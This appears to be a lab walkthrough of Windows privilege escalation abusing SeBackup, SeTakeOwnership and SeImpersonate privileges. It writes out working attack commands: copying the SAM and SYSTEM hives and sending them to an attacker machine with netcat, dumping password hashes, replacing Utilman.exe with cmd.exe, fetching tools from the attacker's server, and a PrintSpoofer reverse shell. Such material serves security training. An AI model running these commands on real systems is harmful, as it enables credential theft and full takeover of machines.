**User Privileges**

First we need to check what privilege current user have.

***whoami /priv*** >> It will tell what privilege current user have.

<img width="755" height="260" alt="image" src="https://github.com/user-attachments/assets/133c4d63-3d46-4586-9262-c7c78a72c95c" />

These two privileges are not useful for privilege escalations. Lets open CMD as administrator and check again

<img width="643" height="416" alt="image" src="https://github.com/user-attachments/assets/b8e51f89-99fa-4582-b88b-a8435ec6e265" />

<img width="728" height="652" alt="image" src="https://github.com/user-attachments/assets/6bbd2b3c-d3fe-465a-8f80-a0c50b99f1f3" />

The above screen is called UAC (User Account Control).

Lets check our privilege again

<img width="786" height="381" alt="image" src="https://github.com/user-attachments/assets/e2bfae84-653e-40c1-b1ab-4a7ba634f27b" />

Now we can see some more privileges. We can use SeBackupPrivilege and SeRestorePrivilege to escalate privileges.

NOTE: When we run any application as Administrator, it does not mean we are Administrator user. When we run any application as normal user, Windows restrict some functionality. But when we run any application as Administrator, Windows unlock the full functionality of that user.

**1. SeBackupPrivilege** :-If any user has this privilege, he can ready any file in the system

<img width="680" height="181" alt="image" src="https://github.com/user-attachments/assets/a0f34b72-2af3-487f-bab1-ff6c3b07a88f" />

We have copied the SAM file in user’s folder.

<img width="786" height="581" alt="image" src="https://github.com/user-attachments/assets/67688e0c-160c-4ceb-bf76-0f9c8cf6cae4" />

Similarly, we can copy the SYSTEM file as well.

Now we need to transfer these files from target machine to local machine and crack the passwords.

Lets download NetCat from the browser on the Local machine.

<img width="786" height="425" alt="image" src="https://github.com/user-attachments/assets/a9e61d2a-8d8b-40d0-a28d-ce6321baf772" />

<img width="786" height="264" alt="image" src="https://github.com/user-attachments/assets/0f5aba03-bf9d-461e-b007-08c6ef02e113" />

File has been downloaded.

We have moved the NetCat .exe file to current folder and started a python server.

<img width="786" height="162" alt="image" src="https://github.com/user-attachments/assets/342012e5-2797-4799-9294-cf180746d6fa" />

On the Target machine, lets open the PowerShell

***Invoke-WebRequest -Uri http://10.129.112.128:9999/nc64.exe -OutFile nc.exe***

<img width="786" height="358" alt="image" src="https://github.com/user-attachments/assets/128b7bd1-7898-4548-8040-218cb0b2b806" />

File has been transferred. Lets install it

<img width="751" height="480" alt="image" src="https://github.com/user-attachments/assets/2b4f2281-fb89-4a62-9084-d641539f9146" />

Lets transfer the file with NetCat

<img width="786" height="153" alt="image" src="https://github.com/user-attachments/assets/b65ffd99-15ee-4a67-9c12-ed14f71a24c7" />

***nc 10.129.112.128 4444 < SAM*** >> On the target machine

***nc -nvlp 4444 > SAM*** >> On Local machine

<img width="706" height="167" alt="image" src="https://github.com/user-attachments/assets/2e10643e-d8c8-46a3-98ec-a8bf093f0ac6" />

We can see SAM and SYSEM files are copied to our local machine.

***impacket-secretsdump LOCAL -sam SAM -system SYSTEM***

<img width="786" height="245" alt="image" src="https://github.com/user-attachments/assets/864910cb-cba6-4c7c-ad9e-11c31bce6757" />

And we have got all the hashes of the users.

***2. SeRestorePrivilege***:- If any user has this privilege, he can write any file in the system.

***3. SeTakeOwnershipPrivilege***:- If any user is having this privilege, he can be owner of any file.

<img width="786" height="211" alt="image" src="https://github.com/user-attachments/assets/161b1153-0341-429c-b1e4-c1a9c752d135" />

First, we will become owner of any file, then we can change its permissions (Read/write/modify)

As of now its state is Disable. However, we don't need to manually make it enable. Whenever we put its command, windows will automatically make the status Enable.

***takeown /f C:\Windows\System32\Utilman.exe***

<img width="786" height="78" alt="image" src="https://github.com/user-attachments/assets/9e0c09a1-c87a-47a7-8f80-8ab1464025dc" />

What is Utilman.exe ?

<img width="786" height="531" alt="image" src="https://github.com/user-attachments/assets/86390ae7-4d3e-46c4-83fd-df4338c8c5e6" />

<img width="786" height="501" alt="image" src="https://github.com/user-attachments/assets/67e242be-2c3a-4ef0-8c1f-ee2423fa546b" />

Before login or at Lock Screen, Windows gives some options. These options are available due to Utilman.exe.

Utilman.exe always runs as NT_AUTHORITY\SYSTEM.

So if we replace these options with a Shell, we can get NT_AUTHORITY\SYSTEM shell without login at the machine.

Now we have became the owner of the Utilman.exe, now we will change its permissions.

***icacls C:\Windows\System32\Utilman.exe /grant thmtakeOwnership:F***

<img width="786" height="142" alt="image" src="https://github.com/user-attachments/assets/624478b0-db1a-4e94-a20c-fea464ae5471" />

Now, lets copy CMD to Utilman.exe

***copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe /y***

<img width="786" height="127" alt="image" src="https://github.com/user-attachments/assets/36f8d01b-84b3-4ed3-909d-4d5a9f8a5bbe" />

Lets open the Utilman.exe again

<img width="786" height="502" alt="image" src="https://github.com/user-attachments/assets/24b9b0a3-e6a3-4bb9-8d5b-da2fc11e4900" />

And we are NT_AUTHORITY\SYSTEM

**3. SeAssignPrimaryTokenPrivilege / SeImpersonatePrivilege**

Now, lets put machine IP address on the browser and we will get a web shell.

<img width="786" height="238" alt="image" src="https://github.com/user-attachments/assets/1b8a1f11-4729-47b1-b087-ba4422c1a5ba" />

We can run CMD commands. Lets check what privilege we have for this user

<img width="786" height="377" alt="image" src="https://github.com/user-attachments/assets/01b02cb9-b4f4-4388-bfcc-5e2ac7a943bf" />

In windows every user gets a token. This token defines the permissions and access of a user in the system. It also authenticates a user.

Now, it we get a token of any other user, with the help of SeAssignPrimaryTokenPrivilege / SeImpersonatePrivilege we can run Processes with that user’s privilege.

**SeImpersonatePrivilege**: — This work on a thread of a Process. A Process contains multiple threads.

**SeAssignPrimaryTokenPrivilege** : — This works on the whole Process.

<img width="696" height="297" alt="image" src="https://github.com/user-attachments/assets/8b7f7c6c-c476-4c37-bff5-7eecff5c3622" />

<img width="615" height="260" alt="image" src="https://github.com/user-attachments/assets/234cc90c-2efe-4f9e-96a7-1a3b15b47f67" />

Now, to use these user privileges, there must be some vulnerability so that we can get some other user’s token. So until and unless there is a vulnerability, we cannot use these tokens.

There is a vulnerability called PrintSpoofer. There is a vulnerability in Spooler.exe due to which we can see tokens of NT AUTHORITY\SYSTEM.

Every logged in user gets a token. That token exists till the user is logged in. Once user logs out, the token got expired.

However, NT AUTHORITY\SYSTEM token is always there. Once the system boots up, multiple services run with NT AUTHORITY\SYSTEM and hence its token also gets generated.

<img width="786" height="452" alt="image" src="https://github.com/user-attachments/assets/97586376-728c-4129-9100-10c130bfd5b9" />

Now we need to transfer netcat and print spoofer into the target machine.

Lets start a python server on local machine

***python-m http.server 9999***

***curl http://10.128.117.19:9999/nc.exe -o C:\Users\Public\nc.exe***

TIP: User Users\Public folder to keep downloaded file.

<img width="786" height="189" alt="image" src="https://github.com/user-attachments/assets/aee6c920-9efd-4f5c-8c34-f7fe9a344648" />

<img width="747" height="460" alt="image" src="https://github.com/user-attachments/assets/1a8fae49-7262-4128-b2d0-b520f42efbd8" />

Now lets download printspoofer.exe and transfer to target machine

<img width="786" height="384" alt="image" src="https://github.com/user-attachments/assets/2d5c8f22-e617-4fcf-b86e-4db1d2947880" />

***curl http://10.128.117.19:9999/PrintSpoofer64.exe -o C:\Users\Public\PrintSpoofer64.exe***

<img width="682" height="140" alt="image" src="https://github.com/user-attachments/assets/150c819c-0d43-426e-9ea2-10c630d2dfd8" />

<img width="786" height="380" alt="image" src="https://github.com/user-attachments/assets/3563ddf6-71a4-4707-9e18-434de35cf505" />

Both netcat and PrintSpoofer are in the Target machine.

Lets start a netcat listner on Local machine

<img width="786" height="179" alt="image" src="https://github.com/user-attachments/assets/b9b86651-05eb-432a-81ab-584057fc3680" />

C:\Users\Public\PrintSpoofer64.exe -c “C:\Users\Public\nc.exe -e cmd.exe 10.128.117.19 4445”

<img width="642" height="285" alt="image" src="https://github.com/user-attachments/assets/2588fb90-d591-4c3e-b949-db470b3bad17" />

And we got shell of NT_AUTHORITY\USER

<img width="786" height="262" alt="image" src="https://github.com/user-attachments/assets/658e0978-e524-4d81-8985-679c6520733e" />
